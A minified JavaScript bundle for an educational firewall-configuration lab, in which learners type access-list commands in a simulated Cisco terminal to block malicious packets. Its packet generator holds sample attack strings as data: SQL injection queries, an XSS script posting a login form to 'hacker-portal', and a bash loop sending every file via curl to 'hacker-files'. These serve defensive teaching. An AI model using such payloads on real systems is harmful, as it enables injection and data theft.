"use strict";(self["webpackChunkexp_8"]=self["webpackChunkexp_8"]||[]).push([[531],{3679:function(t,e,s){s.r(e),s.d(e,{default:function(){return ie}});var a=s(3396),o=s(7139),i=s(9242),n=s.p+"img/firewall.84c5bd0f.jpg",l=s.p+"img/workstation.38593c56.svg",r=s.p+"img/trash.0f90bd0e.png";const c={class:"flex-box"},d=(0,a._)("div",{id:"snackbar"},null,-1),p={class:"rem-space"},h={class:"row-1"},u=(0,a._)("h4",null,"Understanding Firewalls",-1),f=(0,a._)("p",null," Firewalls are a type of network security system that monitors and controls incoming and outgoing network traffic based on predetermined security rules. A firewall typically establishes a barrier between a trusted internal network and untrusted external network, such as the Internet. Firewalls are often categorized as either network firewalls or host-based firewalls. ",-1),m=(0,a._)("p",null," In this experiment, you will learn how to configure a firewall to block traffic from specific IP address that is sending malicious packets to a server. ",-1),g=(0,a._)("br",null,null,-1),k={key:0,class:"content"},y=(0,a._)("h4",null,"Step 1: Entering configuration mode",-1),w=(0,a._)("p",null," Enter the configuration mode of the firewall by typing the following command: ",-1),b=(0,a._)("br",null,null,-1),v={class:"code"},C={key:1,class:"content"},E=(0,a._)("h4",null,"Step 2: Viewing server network information",-1),_=(0,a._)("br",null,null,-1),I={class:"code"},S={key:2,class:"content"},T=(0,a._)("h4",null,"Step 3: View Access List",-1),x=(0,a._)("p",null," Access lists are a set of rules that are used to filter traffic. They are used to control the traffic that is allowed to pass through a router or a firewall. Access lists are used to filter traffic based on the source and destination IP addresses, source and destination ports, and protocol type. In this experiment, you will be using access lists to block traffic from specific ports from a server to a client. ",-1),P=(0,a._)("br",null,null,-1),A=(0,a._)("p",null," Get the access list information of the firewall using the following command: ",-1),D={class:"code"},L={key:3,class:"content"},R=(0,a._)("h4",null,"Step 4: Modifying the Access List",-1),M=(0,a._)("p",null," Access lists are a set of rules that are used to filter traffic. Modify the access list to block and allow traffic from specific ports from a server to a client. Towards the right side of this experiment you will see a list of packets. The packets are sent from a client to a server. The packets hold an IP address and it's packet content. Click on the packet to view the complete packet content and decide which packets to block and allow based on the packet content. Malicious packets usually hold SQL Injection code or XSS scripts or Bash Scripts. You can block these packets by blocking the IP Address from which the packets are sent. Use the below commands to do so. ",-1),F=(0,a._)("br",null,null,-1),B=(0,a._)("p",null," Use the following command to block traffic of tcp packets from a specific Client IP Address to the server: ",-1),N={class:"code"},O=(0,a._)("br",null,null,-1),H=(0,a._)("p",null," Use the following command to allow traffic of tcp packets from a specific port to the server: ",-1),W={class:"code"},G=(0,a._)("p",null," Note that we are only dealing with tcp packets in this experiment. Hence, tcp is always used in the above commands. In the commands, allow-packet and block-packet are the names of the access lists that you want to modify, these are existing access lists, creation of new access-list is restricted for this experiment. The SERVER_IP_ADDRESS is the IP address of the server and the CLIENT_IP_ADDRESS is the client IP address from which you want to block traffic, refer to the packet list to find the IP address numbers and the output of the second step to find the IP address of the server. ",-1),V={class:"row-2"},j={class:"col-1"},z={class:"network-row"},K=(0,a._)("img",{src:n,alt:"firewall",style:{width:"150px",height:"auto"}},null,-1),$=(0,a._)("img",{src:l,alt:"desktop",style:{width:"150px",height:"auto"}},null,-1),q=(0,a._)("img",{src:r,alt:"trash",style:{width:"100px",height:"auto"}},null,-1),U={class:"packet-row"},Y=(0,a._)("h2",null," Packets ",-1),Z={class:"col-2"},J={class:"terminal-input"};function Q(t,e,s,n,l,r){const Q=(0,a.up)("StyledButton"),X=(0,a.up)("ServerComponent"),tt=(0,a.up)("EndSystemComponent"),et=(0,a.up)("NetworkInteractionComponent"),st=(0,a.up)("PackageComponent");return(0,a.wg)(),(0,a.iD)("main",null,[(0,a._)("div",c,[d,(0,a._)("div",p,[(0,a._)("div",h,[u,f,m,g,1===l.step?((0,a.wg)(),(0,a.iD)("div",k,[y,w,b,(0,a._)("div",v,[(0,a._)("code",{onClick:e[0]||(e[0]=t=>r.copyToClipboard("configure terminal"))},"configure terminal ")])])):(0,a.kq)("",!0),2===l.step?((0,a.wg)(),(0,a.iD)("div",C,[E,(0,a._)("p",null,[(0,a.Uk)(" Get the interface information of the server which is in interface "),(0,a._)("span",{onClick:e[1]||(e[1]=t=>r.copyToClipboard("GigabitEthernet0/0")),id:"gigabit"},'"GigabitEthernet0/0"'),(0,a.Uk)(". Try to find the IP address of the server using the following command: ")]),_,(0,a._)("div",I,[(0,a._)("code",{onClick:e[2]||(e[2]=t=>r.copyToClipboard("show interface INTERFACE_NAME"))},"show interface INTERFACE_NAME ")])])):(0,a.kq)("",!0),3===l.step?((0,a.wg)(),(0,a.iD)("div",S,[T,x,P,A,(0,a._)("div",D,[(0,a._)("code",{onClick:e[3]||(e[3]=t=>r.copyToClipboard("show access-lists"))},"show access-lists ")])])):(0,a.kq)("",!0),4===l.step?((0,a.wg)(),(0,a.iD)("div",L,[R,M,F,B,(0,a._)("div",N,[(0,a._)("code",{onClick:e[4]||(e[4]=t=>r.copyToClipboard("access-list block-packet deny tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS"))},"access-list block-packet deny tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS ")]),O,H,(0,a._)("div",W,[(0,a._)("code",{onClick:e[5]||(e[5]=t=>r.copyToClipboard("access-list allow-packet allow tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS"))},"access-list allow-packet allow tcp CLIENT_IP_ADDRESS host SERVER_IP_ADDRESS ")]),G,(0,a.Wm)(Q,{text:"Verify Rules",disable:l.disableButton,onClick:r.verify},null,8,["disable","onClick"])])):(0,a.kq)("",!0)]),(0,a._)("div",V,[(0,a._)("div",j,[(0,a._)("div",z,[(0,a.Wm)(et,{ref:"childComponentRef"},{default:(0,a.w5)((()=>[(0,a.Wm)(tt,{top:"10%",left:"5%",class:"box",id:"server"},{default:(0,a.w5)((()=>[(0,a.Wm)(X,{"ip-address":"Server",port1:2,port2:2,port3:2,port4:2,"port-labels":l.serverPortLabels},null,8,["port-labels"])])),_:1}),(0,a.Wm)(tt,{top:"40%",left:"45%",class:"box",id:"firewall"},{default:(0,a.w5)((()=>[K])),_:1}),(0,a.Wm)(tt,{top:"60%",left:"5%",class:"box",id:"client","package-info":l.packetAnimationList},{default:(0,a.w5)((()=>[$])),_:1},8,["package-info"]),(0,a.Wm)(tt,{top:"39%",left:"80%",class:"box",id:"trash"},{default:(0,a.w5)((()=>[q])),_:1})])),_:1},512)]),(0,a._)("div",U,[Y,((0,a.wg)(!0),(0,a.iD)(a.HY,null,(0,a.Ko)(l.packets,((t,e)=>((0,a.wg)(),(0,a.iD)("div",{class:"packet-wrapper",key:e,style:(0,o.j5)({backgroundColor:r.getPacketWrapperColor(t.packetStatus),boxShadow:l.currentPacketIndex===e?"0px 4px 20px #0077ff":"",border:l.currentPacketIndex===e?"4px solid #0077ff":""})},[(0,a._)("span",{class:"packet-index",style:(0,o.j5)({backgroundColor:"COMPLETE"===t.packetStatus?"#b0b0b0":"#5bb644"})},(0,o.zw)(e),5),(0,a.Wm)(st,{data:[t.ipAddress,t.data.slice(0,10)+"..."],"data-on-click":[t.data],"background-color":"COMPLETE"===t.packetStatus?"#d7d7d7":t.backgroundColor},null,8,["data","data-on-click","background-color"])],4)))),128))])]),(0,a._)("div",Z,[(0,a._)("div",{class:"terminal",onClick:e[8]||(e[8]=(...t)=>r.terminalFocus&&r.terminalFocus(...t))},[((0,a.wg)(!0),(0,a.iD)(a.HY,null,(0,a.Ko)(l.terminal,((t,e)=>((0,a.wg)(),(0,a.iD)("span",{class:"terminal-op",key:e},(0,o.zw)(t),1)))),128)),(0,a._)("div",J,[(0,a._)("span",null,(0,o.zw)(l.terminalStarterText),1),(0,a.wy)((0,a._)("textarea",{class:"terminal-input-field",id:"terminal-ip","onUpdate:modelValue":e[6]||(e[6]=t=>l.terminalInput=t),onKeydown:e[7]||(e[7]=(...t)=>r.onKeyDownTerminal&&r.onKeyDownTerminal(...t))},null,544),[[i.nr,l.terminalInput]])])])])])])])])}s(7658);const X=t=>((0,a.dD)("data-v-a42d58b6"),t=t(),(0,a.Cn)(),t),tt={id:"top-bar"},et=X((()=>(0,a._)("div",{class:"side-space"},null,-1))),st={class:"title"},at=X((()=>(0,a._)("div",{class:"side-space"},[(0,a._)("button",{class:"submit-report"},"Report a Bug")],-1)));function ot(t,e,s,i,n,l){return(0,a.wg)(),(0,a.iD)("div",tt,[et,(0,a._)("div",st,(0,o.zw)(s.title),1),at])}var it={name:"TopBar",props:{title:{type:String,default:"Packet Simulator"}}},nt=s(89);const lt=(0,nt.Z)(it,[["render",ot],["__scopeId","data-v-a42d58b6"]]);var rt=lt;const ct=t=>((0,a.dD)("data-v-c6def8da"),t=t(),(0,a.Cn)(),t),dt={id:"margin-container"},pt={id:"root"},ht=ct((()=>(0,a._)("svg",{id:"lineCanvas"},null,-1))),ut={id:"overlay"};function ft(t,e,s,o,i,n){return(0,a.wg)(),(0,a.iD)("div",dt,[(0,a._)("div",pt,[ht,(0,a._)("div",ut,[(0,a.WI)(t.$slots,"default",{},void 0,!0)])])])}var mt={name:"NetworkInteractionComponent",props:{onPackageAnimationEnd:{type:Function},onPackageReachDestination:{type:Function}},mounted(){let t=document.getElementById("margin-container").getBoundingClientRect(),e=t.width-50+"px",s=t.height-50+"px";document.getElementById("root").style.width=e,document.getElementById("root").style.height=s,document.getElementById("lineCanvas").style.width=e,document.getElementById("lineCanvas").style.height=s,document.getElementById("overlay").style.width=e,document.getElementById("overlay").style.height=s},methods:{drawSVGLine(t,e,s,a,o,i){let n=document.getElementById("lineCanvas"),l=document.createElementNS("http://www.w3.org/2000/svg","line");if(o?l.setAttribute("style","stroke:"+o+";stroke-width:1"):l.setAttribute("style","stroke:rgb(0,0,0);stroke-width:1"),l.setAttribute("x1",t),l.setAttribute("y1",e),l.setAttribute("x2",s),l.setAttribute("y2",a),n.appendChild(l),i){let o=document.createElementNS("http://www.w3.org/2000/svg","text");o.setAttribute("x",(t+s)/2),o.setAttribute("y",(e+a)/2-6),o.setAttribute("text-anchor","middle"),o.setAttribute("alignment-baseline","middle"),o.setAttribute("font-size","12px"),o.setAttribute("font-weight","500"),o.setAttribute("fill","black"),o.setAttribute("transform","rotate("+180*Math.atan((a-e)/(s-t))/Math.PI+" "+(t+s)/2+" "+(e+a)/2+")"),o.innerHTML=i,n.appendChild(o)}},animatePackage(t,e,s,a){let o=document.getElementById(e),i=document.getElementById(t),n=document.getElementById(s),l=document.getElementById("overlay");if(!o||!i||!n||!l)return;let r=40,c=o.offsetHeight/2,d=n.offsetLeft+n.offsetWidth,p=n.offsetTop+n.offsetHeight;o.remove(),l.appendChild(o),o.style.left=d+"px",o.style.top=p+"px";let h=n.offsetLeft+n.offsetWidth/2-r,u=n.offsetTop+n.offsetHeight/2-c;o.style.left=h+"px",o.style.top=u+"px";let f=async()=>{if(h=Math.round(h),u=Math.round(u),o.offsetLeft===h&&o.offsetTop===u){let t=i.offsetLeft+i.offsetWidth/2-r,s=i.offsetTop+i.offsetHeight/2-c;o.style.left=t+"px",o.style.top=s+"px";let n=async()=>{if(t=Math.round(t),s=Math.round(s),o.offsetLeft===t&&o.offsetTop===s){let t=i.offsetLeft+i.offsetWidth,s=i.offsetTop+i.offsetHeight;o.style.left=t+"px",o.style.top=s+"px";let n=()=>{o.offsetLeft===t&&o.offsetTop===s?(this.onPackageAnimationEnd&&this.onPackageAnimationEnd(e),a&&a()):setTimeout((()=>{n()}),100)};n()}else setTimeout((()=>{n()}),100)};n().then((()=>{this.onPackageReachDestination&&this.onPackageReachDestination(e)}))}else setTimeout((()=>{f()}),500)};f()},arrangePackages(t,e){if(!t)return;let s=document.getElementById(t),a=document.getElementById("overlay"),o=s.offsetLeft+s.offsetWidth,i=s.offsetTop+s.offsetHeight;console.log(e);for(let n=0;n<e.length;n++){console.log(e[n],"error");let t=document.getElementById(e[n]);a.appendChild(t),t.style.left=o+"px",t.style.top=i+"px";let s=o+15*n,l=i+15*n;t.style.left=s+"px",t.style.top=l+"px"}},drawLine(t,e,s,a){let o=document.getElementById(t),i=document.getElementById(e);if(!o||!i)return;let n=o.offsetLeft+o.offsetWidth/2,l=o.offsetTop+o.offsetHeight/2,r=i.offsetLeft+i.offsetWidth/2,c=i.offsetTop+i.offsetHeight/2;console.log(n,l,r,c,"coords"),s||(s="black"),a?this.drawSVGLine(n,l,r,c,s,a):this.drawSVGLine(n,l,r,c,s,"")},drawLineOffset(t,e,s,a,o,i,n){let l=document.getElementById(t),r=document.getElementById(e);if(!l||!r)return;let c=l.offsetLeft+l.offsetWidth/2,d=l.offsetTop+l.offsetHeight/2,p=r.offsetLeft+r.offsetWidth/2,h=r.offsetTop+r.offsetHeight/2;if(a)if(n){let t=c-s/2,e=p-s/2;this.drawSVGLine(t,d,e,h,o,i)}else{let t=c+s/2,e=p+s/2;this.drawSVGLine(t,d,e,h,o,i)}else if(n){let t=d-s/2,e=h-s/2;this.drawSVGLine(c,t,p,e,o,i)}else{let t=d+s/2,e=h+s/2;this.drawSVGLine(c,t,p,e,o,i)}},clearLines(){let t=document.getElementById("lineCanvas");t.parentNode.replaceChild(t.cloneNode(!1),t)}}};const gt=(0,nt.Z)(mt,[["render",ft],["__scopeId","data-v-c6def8da"]]);var kt=gt;const yt=["id"],wt={id:"endSystemVector"},bt=["id"];function vt(t,e,s,i,n,l){const r=(0,a.up)("PackageComponent");return(0,a.wg)(),(0,a.iD)("div",{class:(0,o.C_)([s.Class,"rootElementEndSystem"]),id:s.Id,style:(0,o.j5)({top:s.top,left:s.left})},[(0,a._)("div",wt,[(0,a.WI)(t.$slots,"default",{},void 0,!0)]),((0,a.wg)(!0),(0,a.iD)(a.HY,null,(0,a.Ko)(s.packageInfo,((t,e)=>((0,a.wg)(),(0,a.iD)("div",{key:e},[t.packageId?((0,a.wg)(),(0,a.iD)("div",{key:0,style:(0,o.j5)([{position:"absolute",right:"-88px"},{transition:"ease-in-out "+(t.animationSeconds??1)+"s",visibility:t.displayPackage?"visible":"hidden"}]),id:t.packageId,class:"package"},[(0,a.Wm)(r,{data:t.data,"background-color":t.packageBackgroundColor},null,8,["data","background-color"])],12,bt)):(0,a.kq)("",!0)])))),128))],14,yt)}const Ct=t=>((0,a.dD)("data-v-60320ba6"),t=t(),(0,a.Cn)(),t),Et={class:"packageText"},_t={key:0,class:"dash"},It={class:"card"},St=Ct((()=>(0,a._)("h3",null," Package Content: ",-1))),Tt=Ct((()=>(0,a._)("span",null," Click to copy IP Address ",-1))),xt={class:"packageText"};function Pt(t,e,s,i,n,l){return(0,a.wg)(),(0,a.iD)("div",null,[(0,a._)("div",{id:"packageBox",style:(0,o.j5)({backgroundColor:s.backgroundColor}),onClick:e[0]||(e[0]=t=>n.isViewing=!n.isViewing)},[((0,a.wg)(!0),(0,a.iD)(a.HY,null,(0,a.Ko)(s.data,((t,e)=>((0,a.wg)(),(0,a.iD)("div",{key:e},[(0,a._)("div",Et,(0,o.zw)(t),1),l.addDash(e)?((0,a.wg)(),(0,a.iD)("div",_t)):(0,a.kq)("",!0)])))),128))],4),s.dataOnClick&&n.isViewing?((0,a.wg)(),(0,a.iD)("div",{key:0,class:"packageTextHidden",onClick:e[2]||(e[2]=t=>n.isViewing=!n.isViewing)},[(0,a._)("div",It,[St,(0,a._)("h5",{onClick:e[1]||(e[1]=t=>l.copyToClipboard(s.data[0]))}," IP Address: "+(0,o.zw)(s.data[0]),1),Tt,((0,a.wg)(!0),(0,a.iD)(a.HY,null,(0,a.Ko)(s.dataOnClick,((t,e)=>((0,a.wg)(),(0,a.iD)("div",{key:e},[(0,a._)("div",xt,(0,o.zw)(t),1)])))),128))])])):(0,a.kq)("",!0)])}var At={name:"PackageComponent",methods:{addDash(t){return this.data.length!==t+1},copyToClipboard(t){navigator.clipboard.writeText(t)}},props:{data:{type:Array},dataOnClick:{type:Array},backgroundColor:{type:String,default:"#ABFF8E"}},data(){return{isViewing:!1}}};const Dt=(0,nt.Z)(At,[["render",Pt],["__scopeId","data-v-60320ba6"]]);var Lt=Dt,Rt={name:"EndSystemComponent",components:{PackageComponent:Lt},props:{Class:{type:String},Id:{type:String},top:{type:String},left:{type:String},packageInfo:{type:[Object]}},computed:{packagePosition(){return"-50px"}}};const Mt=(0,nt.Z)(Rt,[["render",vt],["__scopeId","data-v-0ce0fef6"]]);var Ft=Mt;const Bt=t=>((0,a.dD)("data-v-30723712"),t=t(),(0,a.Cn)(),t),Nt={class:"root-col"},Ot={class:"col"},Ht={class:"id-address"},Wt={class:"col"},Gt={class:"circle-div-text"},Vt={class:"circle-div-text"},jt={class:"circle-div-text"},zt={class:"circle-div-text"},Kt=Bt((()=>(0,a._)("div",{class:"title"}," Respond ",-1))),$t={class:"respond-buttons"},qt=["onClick"];function Ut(t,e,s,i,n,l){return(0,a.wg)(),(0,a.iD)("div",Nt,[(0,a._)("div",{class:"root",style:(0,o.j5)({backgroundColor:s.backgroundColor??"#AA9A8B",border:s.displayExtraOptions?"none":"1px solid black"})},[(0,a._)("div",Ot,[(0,a._)("span",Ht,(0,o.zw)(s.ipAddress),1)]),(0,a._)("div",Wt,[(0,a._)("div",{class:"circle-div",style:(0,o.j5)({backgroundColor:l.port0Color})},[(0,a._)("span",Gt,(0,o.zw)(l.portLabel(0)),1)],4),(0,a._)("div",{class:"circle-div",style:(0,o.j5)({backgroundColor:l.port1Color})},[(0,a._)("span",Vt,(0,o.zw)(l.portLabel(1)),1)],4),(0,a._)("div",{class:"circle-div",style:(0,o.j5)({backgroundColor:l.port2Color})},[(0,a._)("span",jt,(0,o.zw)(l.portLabel(2)),1)],4),(0,a._)("div",{class:"circle-div",style:(0,o.j5)({backgroundColor:l.port3Color})},[(0,a._)("span",zt,(0,o.zw)(l.portLabel(3)),1)],4)])],4),s.displayExtraOptions?((0,a.wg)(),(0,a.iD)("div",{key:0,class:"extra-options",style:(0,o.j5)({visibility:0!==s.responseData.length?"visible":"hidden"})},[Kt,(0,a._)("div",$t,[((0,a.wg)(!0),(0,a.iD)(a.HY,null,(0,a.Ko)(s.responseData,((t,e)=>((0,a.wg)(),(0,a.iD)("button",{key:e,style:(0,o.j5)({backgroundColor:t.backgroundColour}),onClick:e=>this.$emit("respond",t)}," Port: "+(0,o.zw)(parseInt(t.serverPort)+1),13,qt)))),128))])],4)):(0,a.kq)("",!0)])}var Yt={name:"ServerComponent",props:{port1:Number,port2:Number,port3:Number,port4:Number,portLabels:[],ipAddress:String,displayExtraOptions:Boolean,responseData:[],backgroundColor:String},computed:{port0Color(){return 0===this.port1?"#FF0000":1===this.port1?"#33FF00":2===this.port1?"#FFD600":"#FF0000"},port1Color(){return 0===this.port2?"#FF0000":1===this.port2?"#33FF00":2===this.port2?"#FFD600":"#FF0000"},port2Color(){return 0===this.port3?"#FF0000":1===this.port3?"#33FF00":2===this.port3?"#FFD600":"#FF0000"},port3Color(){return 0===this.port4?"#FF0000":1===this.port4?"#33FF00":2===this.port4?"#FFD600":"#FF0000"}},methods:{portLabel(t){return this.portLabels&&this.portLabels.length>t?this.portLabels[t]:t+1}}};const Zt=(0,nt.Z)(Yt,[["render",Ut],["__scopeId","data-v-30723712"]]);var Jt=Zt;const Qt=["disabled"];function Xt(t,e,s,i,n,l){return(0,a.wg)(),(0,a.iD)("button",{style:(0,o.j5)(l.buttonStyle),onClick:e[0]||(e[0]=(...t)=>s.clickFunction&&s.clickFunction(...t)),disabled:s.disable,class:"styled-button"},(0,o.zw)(s.text),13,Qt)}var te={name:"StyledButton",props:{backgroundColor:{type:String,default:"#288EC8"},textColor:{type:String,default:"white"},text:{type:String,default:"Button"},clickFunction:{type:Function,default:()=>{}},disable:{type:Boolean,default:!1},invisible:{type:Boolean,default:!1}},computed:{buttonStyle(){return{backgroundColor:this.backgroundColor,color:this.textColor,visibility:this.invisible?"hidden":"visible"}}}};const ee=(0,nt.Z)(te,[["render",Xt],["__scopeId","data-v-a67e5656"]]);var se=ee,ae={components:{StyledButton:se,ServerComponent:Jt,PackageComponent:Lt,EndSystemComponent:Ft,NetworkInteractionComponent:kt,TopBar:rt},mounted(){this.serverIpAddress=Math.floor(255*Math.random())+"."+Math.floor(255*Math.random())+"."+Math.floor(255*Math.random())+"."+Math.floor(255*Math.random());let t=document.getElementsByTagName("textarea");function e(){t[0].style.height="auto",t[0].style.height=this.scrollHeight+"px"}t[0].addEventListener("input",e,!1),this.generateRandomPackets();for(const[s,a]of Object.entries(this.packetConfig))console.log(s),console.log(a.data),console.log(a.accessGroup),this.packets.push({data:a.data,ipAddress:s,packetStatus:"INCOMPLETE",malicious:a.malicious});for(let s=0;s<4;s++){let t=Math.floor(8e3*Math.random())+1e3;this.serverPortLabels.push(t)}setTimeout((()=>{this.$refs.childComponentRef.drawLine("firewall","server","black","allowed packet"),this.$refs.childComponentRef.drawLine("trash","firewall","black","discarded packet"),this.$refs.childComponentRef.drawLine("client","firewall","black","incoming packet")}),500)},data(){return{step:1,disableButton:!1,serverPortLabels:[],serverIpAddress:"",packetConfig:{},terminalStarterText:"ciscoasa> ",terminal:[],currentPacketIndex:-1,terminalInput:"",packets:[],packetsCopy:[],packetAnimationList:[{packageId:"package01",data:[],displayPackage:!1,packageBackgroundColor:"#9efd85",animationSeconds:1}]}},methods:{resetPacketIndex(){this.packets.forEach((t=>{t.packetStatus="INCOMPLETE"}))},generateRandomIP(){return Math.floor(255*Math.random())+"."+Math.floor(255*Math.random())+"."+Math.floor(255*Math.random())+"."+Math.floor(255*Math.random())},generateRandomPackets(){for(let t=0;t<6;t++){let t=Math.random(),e=this.generateRandomIP();if(t>.5){let t=Math.random(),s="";s=t>.3&&t<.5?"SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'admin'":t>.5&&t<.7?"<script>let value = document.getElementById('login-form').value fetch('http://hacker-portal:3000', {method: 'POST', body: value})<\/script>":t>.7&&t<.9?'#!/bin/bash\nfor file in *\ndo\n    if [[ -f $file ]]; then\n        content=$(cat "$file")\n        curl -X POST -d "$content" http://hacker-files:8080\n    fi\ndone\n':t>.9&&t<.95?"DELETE FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'admin'":t<.3&&t>.1?"UPDATE users SET password = 'admin' WHERE username = 'admin' OR 1=1 --'":t<.1?"INSERT INTO users VALUES ('admin', 'admin')":"SELECT * FROM users WHERE username = 'admin' AND password = 'admin'",this.packetConfig[e]={accessGroup:"allow-packet",data:s,malicious:!0}}else{let t="",s=Math.random();t=s>.3&&s<.5?"HTTP/1.1 200 OK\nDate: Mon, 27 Jul 2023 00:09:11 GMT\nServer: Apache/2.2.14 (Win32)\nLast-Modified: Wed, 22 Jul 2009 19:15:56 GMT\nContent-Length: 88\nContent-Type: text/html\nConnection: Closed\n\n<html>\n<body>\n<h1>Hello, World!</h1>\n</body>\n</html>\n":s>.5&&s<.7?"This is a simple text message":s>.7&&s<.9?"This is a very normal text message":s>.9&&s<.95?"HTTPS/1.1 200 OK\nDate: Mon, 27 Jul 2009 04:20:06:09 GMT\nContent-Type: text/html\nConnection: Closed\n\nText message":s<.3&&s>.1?"Hello World":"This is a normal packet",t+="\n";for(let e=0;e<10;e++)t+=String.fromCharCode(Math.floor(26*Math.random())+97);this.packetConfig[e]={accessGroup:"allow-packet",data:t,malicious:!1}}}console.log(this.packetConfig)},verify(){this.verifyRecursive(0)},verifyRecursive(t){this.currentPacketIndex=t,this.packetAnimationList[0].displayPackage=!0;let e=this.packets[t],s=this.packetConfig[e.ipAddress];this.packetAnimationList[0].data=[e.ipAddress,s.data.slice(0,10)+"..."],t>0&&(this.packets[t-1].packetStatus="COMPLETE"),this.disableButton=!0,this.$refs.childComponentRef.animatePackage("firewall","package01","client",(()=>{"allow-packet"!==s.accessGroup?this.$refs.childComponentRef.animatePackage("trash","package01","firewall",(()=>{this.disableButton=!1,this.packetAnimationList[0].displayPackage=!1,!0===e.malicious?(t<this.packets.length-1&&this.verifyRecursive(t+1),t===this.packets.length-1&&(this.packets[t].packetStatus="COMPLETE",this.packets.every((t=>"COMPLETE"===t.packetStatus))&&this.correct1("All packets have been verified"))):(this.incorrect("Incorrect packet configuration, please try again"),this.resetPacketIndex())})):this.$refs.childComponentRef.animatePackage("server","package01","firewall",(()=>{this.disableButton=!1,this.packetAnimationList[0].displayPackage=!1,!1===e.malicious?(t<this.packets.length-1&&this.verifyRecursive(t+1),t===this.packets.length-1&&(this.packets[t].packetStatus="COMPLETE",this.packets.every((t=>"COMPLETE"===t.packetStatus))&&(this.correct1("All packets have been verified"),this.resetPacketIndex()))):(this.incorrect("Incorrect packet configuration, please try again"),this.resetPacketIndex())}))}))},correct1(t){const e=document.getElementById("snackbar");e.innerHTML=t,e.style.backgroundColor="green",e.className="show",setTimeout((function(){e.className=e.className.replace("show","")}),3e3)},incorrect(t){const e=document.getElementById("snackbar");e.innerHTML=t,e.style.backgroundColor="red",e.className="show",setTimeout((function(){e.className=e.className.replace("show","")}),3e3)},terminalFocus(){let t=document.getElementById("terminal-ip");t.scrollTop=t.scrollHeight,t.focus()},copyToClipboard(t){navigator.clipboard.writeText(t),this.correct1("Copied code to clipboard")},onKeyDownTerminal(t){if("Enter"===t.key){t.preventDefault();const e=this.terminalInput;this.terminalInput="";let s=document.getElementById("terminal-ip");if(s.style.height="auto",s.style.height=this.scrollHeight+"px",this.terminal.push(this.terminalStarterText+e),"configure terminal"===e&&"ciscoasa> "===this.terminalStarterText)this.terminalStarterText="ciscoasa(config)# ",1===this.step&&(this.step=2);else if("configure terminal"===e&&"ciscoasa> "!==this.terminalStarterText)this.terminal.push(this.terminalStarterText+"Invalid input detected.");else if("exit"===e&&"ciscoasa(config)# "===this.terminalStarterText)this.terminalStarterText="ciscoasa> ",this.terminal.push(this.terminalStarterText);else if("ciscoasa(config)# "===this.terminalStarterText){let t=e.match(/access-list (\w+-?\w*) (allow|deny) (tcp|udp) (any|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) host (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);if(e.match(/show interface\s.+/g)){const t=e.split(" ")[2];"GigabitEthernet0/0"===t?(this.terminal.push("GigabitEthernet0/0 is up, line protocol is up (connected)"),this.terminal.push("  Hardware is Gigabit Ethernet, address is 001c.73a5.6c00 (bia 001c.73a5.6c00)"),this.terminal.push("  Internet address is "+this.serverIpAddress+"/24"),this.terminal.push("  MTU 1500 bytes, BW 1000000 Kbit/sec, DLY 100 usec,"),this.terminal.push("     reliability 255/255, txload 1/255, rxload 1/255"),this.terminal.push("  Encapsulation ARPA, loopback not set"),this.terminal.push("  Keepalive set (10 sec)"),this.terminal.push("  Full Duplex, 1000Mb/s, media type is RJ45"),this.terminal.push("  output flow-control is unsupported, input flow-control is unsupported"),this.terminal.push("  ARP type: ARPA, ARP Timeout 04:00:00"),this.terminal.push("  Last input 00:00:00, output 00:00:00, output hang never"),this.terminal.push('  Last clearing of "show interface" counters never'),this.terminal.push("  Input queue: 0/75/0/0 (size/max/drops/flushes); Total output drops: 0"),this.terminal.push("  Queueing strategy: fifo"),this.terminal.push("  Output queue: 0/40 (size/max)"),this.terminal.push("  5 minute input rate 0 bits/sec, 0 packets/sec"),this.terminal.push(" 5 minute output rate 0 bits/sec, 0 packets/sec"),2===this.step&&(this.step=3)):this.terminal.push(t+" is down, line protocol is down (notconnect)")}else if("show access-lists"===e)Object.entries(this.packetConfig).forEach((([t,e])=>{"allow-packet"===e.accessGroup?(this.terminal.push("Standard IP access list allow-all"),this.terminal.push("10 permit allow-packet "+t+" host "+this.serverIpAddress)):"block-packet"===e.accessGroup&&(this.terminal.push("Standard IP access list block-all"),this.terminal.push("10 deny block-packet "+t+" host "+this.serverIpAddress))})),3===this.step&&(this.step=4);else if(t){const[e,s,a,o,i,n]=t;if(console.log(e),console.log("Access List Name:",s),console.log("Type:",a),console.log("Protocol:",o),console.log("Source:",i),console.log("Destination:",n),console.log("Packet Config:",this.packetConfig),this.serverIpAddress!==n)return void this.terminal.push("Destination IP address not found.");if("tcp"!==o)return void this.terminal.push("Only TCP protocol is allowed.");"any"===i?("allow"===a?this.terminal.push("Setting allow rule to all clients for allow-packet group."):this.terminal.push("Setting deny rule to all clients for block-packet group."),Object.entries(this.packetConfig).forEach((([t])=>{"allow-packet"===s&&"allow"===a?this.packetConfig[t].accessGroup="allow-packet":"block-packet"===s&&"deny"===a?this.packetConfig[t].accessGroup="block-packet":this.terminal.push("Access group "+s+" not found for "+a+" does not exist.")}))):this.packetConfig[i]?"allow-packet"===s&&"allow"===a?(this.packetConfig[i].accessGroup="allow-packet",this.terminal.push("Setting allow rule to "+i+" for allow-packet group.")):"block-packet"===s&&"deny"===a?(this.packetConfig[i].accessGroup="block-packet",this.terminal.push("Setting deny rule to "+i+" for block-packet group.")):this.terminal.push("Access group "+s+" not found for "+a+" does not exist."):this.terminal.push("Source IP address not found.")}else this.terminal.push(this.terminalStarterText+"Invalid input detected.")}else this.terminal.push(this.terminalStarterText+"Invalid input detected.")}},getPacketWrapperColor(t){switch(t){case"INCOMPLETE":return"#e2ffd6";case"COMPLETE":return"#eaeaea";default:return"none"}}}};const oe=(0,nt.Z)(ae,[["render",Q]]);var ie=oe}}]);
//# sourceMappingURL=531.c5c971d8.js.map